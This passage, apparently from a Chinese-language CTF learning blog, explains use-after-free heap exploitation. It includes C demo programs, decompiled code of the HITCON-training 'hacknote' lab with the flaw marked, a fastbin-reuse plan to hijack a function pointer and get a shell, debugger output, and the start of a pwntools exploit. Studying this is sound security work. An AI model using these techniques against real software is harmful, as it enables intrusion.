class=\"line\">  a-&gt;func(<span class=\"string\">&quot;this is my function&quot;</span>);</span><br><span class=\"line\">  <span class=\"comment\">// set NULL</span></span><br><span class=\"line\">  a = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;this pogram will crash...\\n&quot;</span>);</span><br><span class=\"line\">  a-&gt;func(<span class=\"string\">&quot;can not be printed...&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t细节注意:编译的时候要指定好libc,不然如果使用的libc版本过高就会有问题,之前一直在踩这个坑…而且如果事先不指定,编译完再patchelf的话也会有问题,(目前还不懂)</p>\n<p>​\tgcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c</p>\n<p>​\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/heap/useafter# ./a.out</span><br><span class=\"line\">this is my function</span><br><span class=\"line\">I can also use it</span><br><span class=\"line\">call print my name</span><br><span class=\"line\">this pogram will crash...</span><br><span class=\"line\">Segmentation <span class=\"title function_\">fault</span> <span class=\"params\">(core dumped)</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t\ta &#x3D; NULL的话 , free的过程是怎样的? NULL修改了什么呢?</p>\n<h2 id=\"看雪的一个例子\"><a href=\"#看雪的一个例子\" class=\"headerlink\" title=\"看雪的一个例子\"></a>看雪的一个例子</h2><p>具体看雪的链接找不到了..</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func1</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;func1\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">hack</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hack\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Pfunc</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">void</span> (*p)();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Pfunc</span>* <span class=\"title\">lpfunc</span> =</span> <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\">    lpfunc-&gt;p = func1;</span><br><span class=\"line\">    lpfunc-&gt;p();</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"built_in\">free</span>(lpfunc);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"type\">long</span>* hack_point = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\">    *hack_point = hack;</span><br><span class=\"line\"> </span><br><span class=\"line\">    lpfunc-&gt;p();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这个函数就是先申请一个Pfunc结构体指针,分配了一块堆空间,然后把它结构体成员p赋值为一个函数地址,就可以调用了. 然后将这个结构体释放,又申请了一个新的堆空间,赋值为另外一个函数,<font color=\"red\">原先的结构体指针仍然可以利用</font> ,</p>\n<p>​\t\t那free和没free有什么差别呢????????? free的话,是把这块空间标记为空闲可用,所以说应该还有一个地方,存储着这块空间的管理结构,但是这块空间本身是没有改变的.</p>\n<h2 id=\"HITCON-training-中的-lab-10-hacknote\"><a href=\"#HITCON-training-中的-lab-10-hacknote\" class=\"headerlink\" title=\"HITCON-training 中的 lab 10 hacknote\"></a>HITCON-training 中的 <a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote\">lab 10 hacknote</a></h2><p>main</p>\n<p>​\t\t获取用户的输入,然后根据输入进行不同的选择</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v5; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      menu();</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">      v3 = atoi(&amp;buf);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      del_note();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">3</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        print_note();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">4</span> )</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">LABEL_13:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid choice&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">      add_note();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;       HackNote       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 1. Add note          &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 2. Delete note       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 3. Print note        &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 4. Exit              &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your choice :&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>add</p>\n<p>​\t\tnotelist这个链表存储内容,链表的每个节点分了两部分,第一部分4字节,存储print_note_content函数地址,第二部分也是一个指针,指向存储malloc的数据的chunk的地址.</p>\n<p>​\t\t例如申请一个8字节大小的content,会得到</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/image-20230416105824835.png\" alt=\"image-20230416105824835\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">add_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _DWORD *v0; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+Ch] [ebp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [esp+10h] [ebp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [esp+14h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v5; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( count &lt;= <span class=\"number\">5</span> )  <span class=\"comment\">//最多分配5个</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !notelist[i] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        notelist[i] = <span class=\"built_in\">malloc</span>(<span class=\"number\">8u</span>);  <span class=\"comment\">//分配一个notelist节点</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !notelist[i] )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Alloca Error&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        *(_DWORD *)notelist[i] = print_note_content; <span class=\"comment\">//存储put函数</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Note size :&quot;</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>);</span><br><span class=\"line\">        size = atoi(&amp;buf);</span><br><span class=\"line\">        v0 = notelist[i]; <span class=\"comment\">//v0等于notelist的第一个8字节,存储put函数</span></span><br><span class=\"line\">        v0[<span class=\"number\">1</span>] = <span class=\"built_in\">malloc</span>(size); <span class=\"comment\">// v0第二个字节,存储真正要存储的数据</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*((_DWORD *)notelist[i] + <span class=\"number\">1</span>) ) <span class=\"comment\">//看有没有分配成功?</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Alloca Error&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content :&quot;</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, *((<span class=\"type\">void</span> **)notelist[i] + <span class=\"number\">1</span>), size);</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success !&quot;</span>);</span><br><span class=\"line\">        ++count;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5; <span class=\"comment\">//这是啥??</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Full&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>delete</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">del_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>); <span class=\"comment\">//输入要释放的index</span></span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( notelist[v1] ) </span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"type\">void</span> **)notelist[v1] + <span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(notelist[v1]);  <span class=\"comment\">// 释放后但没有清零!! 漏洞点</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">print_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( notelist[v1] )   <span class=\"comment\">// 释放后仍然可以调用! 漏洞点!!</span></span><br><span class=\"line\">    (*(<span class=\"type\">void</span> (__cdecl **)(<span class=\"type\">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>​\t\tfree后没有清空notelist的内容,也就是说,还可以继续调用print_note函数,也就是可以调用notelist对应的块的print_note_content函数,如果能够将这个函数修改成后门函数或者system函数的话,就可以getshell.</p>\n<p>​\t\t<font color=\"red\">问题是如何获取这一块空间进行修改呢?</font>, 存储函数地址的这一块空间本质上也是普通的一块堆的空间,可以在释放后重新申请到,所以可以进行释放再申请,但是释放了的话,再申请一次,第一个释放的8字节存放函数地址的chunk还是会被申请为存放函数地址的空间.</p>\n<p>​\t\t不过我们可以最开始连续申请两个notelist,然后再释放,这样的话,第二个notelist存放函数的chunk,就可以被申请作为数据的chunk了</p>\n<p>1.申请note0和note1,大小随意,不是8及以下就行, 如16</p>\n<p>​\t\t不能是8及以下是因为不能和存放函数的chunk进入同一个fastbin的链表,不然会影响,</p>\n<p>​\t\t注意,此时会有4个chunk, 2个是用来存放put和content指针的, 两个是存放数据的</p>\n<p>2.释放note0和note1,这时候有4个bins了,其中0x10大小的就是存放put和content指针的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">fastbins</span><br><span class=\"line\"><span class=\"number\">0x10</span>: <span class=\"number\">0x804b028</span> —▸ <span class=\"number\">0x804b000</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x18</span>: <span class=\"number\">0x804b038</span> —▸ <span class=\"number\">0x804b010</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x20</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x28</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x30</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x38</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><p>申请一个大小为8的note2,这个时候就会分别用到0x10的两个fastbin</p>\n<p><font color=\"red\">而第二个0x10的bin,其实就是note1的存放函数地址的指针</font>,修改为后们函数地址后再通过uaf进行print_note中的函数调用就可以getshell了</p>\n</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">fastbins</span><br><span class=\"line\"><span class=\"number\">0x10</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x18</span>: <span class=\"number\">0x804b038</span> —▸ <span class=\"number\">0x804b010</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x20</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x804b000</span></span><br><span class=\"line\">Size: <span class=\"number\">0x11</span></span><br><span class=\"line\"></span><br><span class=\"line\">Free <span class=\"title function_\">chunk</span> <span class=\"params\">(fastbins)</span> | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b010</span><br><span class=\"line\">Size: 0x19</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b028</span><br><span class=\"line\">Size: 0x11</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>此时,我们在申请的这个note2中,填入magic函数的地址,就覆盖了note0的put和content指针,</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x/<span class=\"number\">4</span>wx <span class=\"number\">0x804b000</span></span><br><span class=\"line\"><span class=\"number\">0x804b000</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000011</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x0a616161</span></span><br><span class=\"line\">为什么一开始不是数据呢,一开始是存放的chunk的结构等信息</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>再调用note0的put,就成功调用了magic函数!exp</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./hacknote&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,context</span>):</span><br><span class=\"line\">    